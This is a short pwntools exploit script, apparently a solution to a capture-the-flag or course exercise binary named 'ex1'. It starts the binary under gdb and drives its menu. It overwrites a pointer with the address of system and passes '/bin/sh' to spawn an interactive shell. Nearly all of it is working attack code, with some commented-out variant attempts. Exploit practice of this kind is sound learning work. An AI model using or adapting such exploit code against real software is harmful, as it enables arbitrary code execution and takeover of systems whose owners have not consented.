from pwn import *

context.arch = "amd64"


context.terminal = ["gnome-terminal", "--geometry=160x80", "-e"]
io = gdb.debug(
    "./bin/ex1",
    """
    set follow-fork-mode parent
    break ex1.c:42
    break ex1.c:69
    c
    c
    c
    """,
)

system = 0x401060


io.sendline(b"4\n")

io.sendline(b"3\n")

io.sendline(b"5\n")
io.sendline(b"1\n")
io.sendline(b"0")

io.sendline(p64(system))
io.send(b"test\n")
io.sendline(b"1\n")
io.sendline(b"1")


io.sendline(b"/bin/sh")
io.send(b"test\n")


io.sendline(b"2\n")
io.sendline(b"1\n")

# io.sendline("5\n")
# io.sendline("1\n")
# io.sendline("0")
# io.sendline(p64(system))
# io.sendline(b"abc")
# io.sendline("1\n")
# io.sendline("1\n")
# io.sendline("1")

# io.sendline(b"/bin/sh")

io.interactive()
